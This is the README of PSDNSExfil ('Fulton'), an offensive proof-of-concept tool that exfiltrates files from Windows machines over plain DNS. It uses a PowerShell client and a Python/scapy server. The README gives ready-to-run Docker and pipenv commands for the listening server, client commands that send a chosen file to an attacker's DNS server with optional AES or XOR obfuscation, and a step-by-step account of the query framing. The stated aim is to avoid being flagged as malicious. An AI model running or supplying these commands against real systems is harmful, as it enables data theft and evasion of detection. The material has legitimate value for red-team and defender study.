# PSDNSExfil
This is a proof of concept tool to exfiltrate data using plain DNS protocol.
I wanted to have a native PowerShell tool that allowed me to exfiltrate files from client's Windows systems. I wanted to program it myself to learn, mostly, as I know there are many other tools out there, but I did it because I could and I wanted a tool that would not be flagged as malicious due to it being publicly widespread.


## Usage
There is a client and a server folder. Self-explanatory for now.
The client is written in PowerShell, and the server is python using scapy as the main way to listen for DNS traffic

### Server 
You can run the server using Docker like this (Have in mind you need the privileges to listen in port 53/tcp and udp, which is a privileged port):
```bash
docker build . -t psdnsexfilserver
docker run -it --rm psdnsexfilserver -h
# Map the DNS ports and a volume to keep the files you exfiltrate from the client-side
mkdir exfiltrated
docker run -it --rm -p53:53 -p53:53/udp  -v $(pwd)/exfiltrated:/exfiltrated psdnsexfilserver -d t.co -o /exfiltrated
# If you want to receive encrypted data with the password 'Strong_Password_yes_123' use:
docker run -it --rm -p53:53 -p53:53/udp  -v $(pwd)/exfiltrated:/exfiltrated psdnsexfilserver -d t.co -o /exfiltrated -e AES -a Strong_Password_yes_123
```

Or just install with pipfile:
```bash
apt install pip
pip install pipenv
pipenv install .
pipenv shell
./fultonserver.py -h
```

### Client 
Copy the folder "client" to your target computer, access it and use the commands available, e.g.: 
```ps1
# Get help, buddy
.\Fulton.ps1 -?
# Exfiltrate a file 
.\Fulton.ps1 -Path exfiltrate.bak -DNSServer <yourfultondns>
# Efiltrate a file without zipping it first
.\Fulton.ps1 -Path exfiltrate.bak -DNSServer <yourfultondns> -DontCompress
# Exfiltrate a file encrypting it with AES first (you need to inform your fultonserver about the encryption as well with the flag -e ENCRYPTION and -a PASSWORD). Disclaimer: Do not take this encryption or the XOR one seriously, take it more as an obfuscation method.
.\Fulton.ps1 -Path exfiltrate.bak -DNSServer <yourfultondns> -EncryptionMethod AES -Password Strong_Password_yes_123
```

# How It Works
This is the pseudocode of the process on the client-side:

1. If compression is desired, it compress the file as ZIP and move it to the %TEMP% dir of the workstation.
2. If encryption is desired, it encrypts the contents of the file with the desired algorithm. Two algorithms are now supported AES or XOR. (Fun note: XOR is not secure at all, as it will leak the password used for encryption when large portions of the data contains zeros (0). You can see in the figures at the end of this list with the raw contents of an encrypted file with XOR).
3. Then calculates the number of queries required for the data. Then set the length into the metadata frame.
4. When the file is prepared, the script generates the metadata frames:
5. If the file was compressed, the script will set the flag "Compressed=1" in the Metadata – Hash frame.
6. If the file was encrypted, set the flag "Encrypted=1" (AES) or "Encrypted=2" (XOR) in the Metadata – Hash frame.
7. Add the length to the Metadata – Hash frame.
8. Generates the Metadata – Hash File Name frame.
9. Add the two metadata frames (hash frame and file name frame) to an array of queries.
10. Read the contents of the file and generates all the required queries. Then add these queries to the array.
11. If threading is desired create with the cmdlet [Start-Job](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/start-job?view=powershell-7.4&viewFallbackFrom=powershell-7.2) a job for each thread. The job will use the cmdlet [Resolve-DnsName](https://learn.microsoft.com/en-us/powershell/module/dnsclient/resolve-dnsname?view=windowsserver2022-ps) to carry out the DNS queries.
